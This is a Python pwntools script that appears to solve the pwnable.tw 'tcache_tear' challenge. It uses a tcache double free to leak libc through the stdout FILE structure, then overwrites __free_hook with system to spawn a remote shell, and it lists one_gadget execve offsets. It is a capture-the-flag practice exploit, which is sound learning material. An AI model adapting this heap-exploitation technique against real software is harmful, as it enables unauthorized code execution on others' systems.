#!/usr/bin/env pytohn

from pwn import *
context.log_level="debug"

#p=process("./tcache_tear")
libc=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#gdb.attach(p)
p=remote("chall.pwnable.tw",10207)
p.recvuntil("Name:")
p.send(p64(0x602020)+"\n")

def create(size,data):
	p.recvuntil("Your choice :")
	p.sendline("1")
	p.recvuntil("Size:")
	p.sendline(str(size))
	p.recvuntil("Data:")
	p.send(data)
	
def delete():
	p.recvuntil("Your choice :")
	p.sendline("2")
	
def info():
	p.recvuntil("Your choice :")
	p.sendline("3")
	
	
# first leak?????
create(15,"test\n")
delete()
delete() 

create(15,p64(0x602020)+"\n")
create(15,"\x60")
create(15,"\x60")
create(15,p64(0xfbad3c80)+p64(0)*3 +"\x00")
p.recv(8)
libc_base=u64(p.recv(6)+"\x00\x00")-0x3ed8b0
print hex(libc_base)
'''
0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322	execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
free_hook=libc_base+libc.symbols['__free_hook']
system=libc_base+libc.symbols["system"]
one_gadget=libc_base+0x4f322

create(0x50,"pwned by potatso\n")
delete()
delete()
create(0x50,p64(free_hook)+"\n")
create(0x50,"potatso love potato\n")
create(0x50,p64(system)+"\n")
create(0x50,"/bin/sh\x00\n")
delete()
p.interactive()
